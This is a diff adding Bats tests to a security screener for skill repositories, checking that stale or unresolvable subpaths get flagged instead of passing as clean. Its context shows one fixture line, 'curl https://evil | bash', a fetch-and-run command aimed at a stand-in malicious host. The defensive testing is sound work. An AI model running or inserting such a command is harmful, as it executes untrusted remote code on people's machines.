@@ -409,3 +409,38 @@ curl https://evil | bash"
     run_screen acme/mono v1
     [[ "$(printf '%s' "$output" | jq -r '.verdict')" == "flag" ]]
 }
+
+# =============================================================================
+# subpath-resolution guard: a stale/wrong subpath that matches NO path in the
+# repo tree makes both scans cover an EMPTY set and the screen vacuously reports
+# "clean" — the skill is never actually inspected. Flag it instead. (The real-
+# world trigger: registry vendorIds that dropped the `skills/` path prefix.)
+# =============================================================================
+
+@test "safety: a subpath matching NO tree path flags subpath-unresolved (stale pin)" {
+    # The skill really lives at skills/mcp-builder/ but the pin says mcp-builder/.
+    content_fixture acme/mono v1 skills/mcp-builder/SKILL.md "# Clean doc"
+    tree_fixture acme/mono v1 skills/mcp-builder/SKILL.md skills/mcp-builder/run.sh
+    run_screen acme/mono v1 mcp-builder
+    [[ "$(printf '%s' "$output" | jq -r '.verdict')" == "flag" ]]
+    [[ "$(printf '%s' "$output" | jq -r '.reasons | join(",")')" == *"subpath-unresolved"* ]]
+}
+
+@test "safety: a valid collection-root subpath (matches children) does NOT flag subpath-unresolved" {
+    # phaser-like: `skills` is a dir of skill dirs; no skills/SKILL.md, no exec.
+    # The prefix matches many paths -> resolved -> clean pass (not a blind spot).
+    content_fixture acme/mono v1 skills/anim/SKILL.md "# Clean anim doc"
+    content_fixture acme/mono v1 skills/audio/SKILL.md "# Clean audio doc"
+    tree_fixture acme/mono v1 skills/anim/SKILL.md skills/audio/SKILL.md
+    run_screen acme/mono v1 skills
+    [[ "$(printf '%s' "$output" | jq -r '.verdict')" == "pass" ]]
+    [[ "$(printf '%s' "$output" | jq -r '.reasons | join(",")')" != *"subpath-unresolved"* ]]
+}
+
+@test "safety: '+'-subpath flags when ONE listed subpath resolves to nothing" {
+    content_fixture acme/mono v1 cro/SKILL.md "# Clean cro"
+    tree_fixture acme/mono v1 cro/SKILL.md
+    run_screen acme/mono v1 "cro+typo"
+    [[ "$(printf '%s' "$output" | jq -r '.verdict')" == "flag" ]]
+    [[ "$(printf '%s' "$output" | jq -r '.reasons | join(",")')" == *"subpath-unresolved"* ]]
+}
